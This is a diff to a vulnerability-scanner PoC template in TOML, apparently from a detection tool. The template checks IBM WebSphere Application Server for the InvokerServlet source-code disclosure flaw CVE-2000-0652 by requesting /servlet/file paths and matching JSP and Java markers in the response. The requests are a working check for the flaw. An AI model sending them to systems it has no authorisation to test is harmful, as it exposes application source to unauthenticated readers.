@@ -1,10 +1,10 @@
 [info]
 author = "AVE"
-description = "IBM WebSphere Application Server InvokerServlet 源代码泄露漏洞检测"
+description = "通过向 IBM WebSphere Application Server 的默认 InvokerServlet 发送包含 /servlet/file 字符串的请求，检测是否存在源代码泄露漏洞。攻击者无需认证即可读取可执行 Web 文件（如 .jsp、.servlet）的源代码。"
 id = "POC-AVE-2000-0503"
-name = "CVE-2000-0652 PoC"
+name = "IBM WebSphere Application Server InvokerServlet 源代码泄露 PoC"
 severity = "medium"
-tags = ["cve-2000-0652"]
+tags = ["ave-2000-0503"]
 vuln_id = [
     "CVE-2000-0652",
     "AVE-2000-0503",
@@ -15,19 +15,38 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/servlet/file/index.jsp"
+path = "/{{BaseURL}}/servlet/file"
 protocol = "http"
 
-[poc.requests.body]
-content = ""
-type = "raw"
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "out.println",
-    "pageEncoding",
-    "<%@",
+    "<html>",
+    "<%",
+    "class ",
+    "import ",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/servlet/file/index.jsp"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<html>",
+    "<%",
+    "class ",
+    "import ",
 ]
